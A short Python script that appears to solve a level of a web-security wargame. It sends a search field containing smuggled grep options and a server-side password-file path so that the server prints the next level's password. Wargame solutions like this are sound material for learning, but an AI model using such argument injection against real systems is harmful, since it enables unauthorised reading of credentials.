import Auther
Auther.passwordLineGetter(
    Auther.request(9, data={"needle": '-hE "[[:alnum:]]{32}" ' + f'{Auther.authPathOnServer(9)}'}).text, 10)()
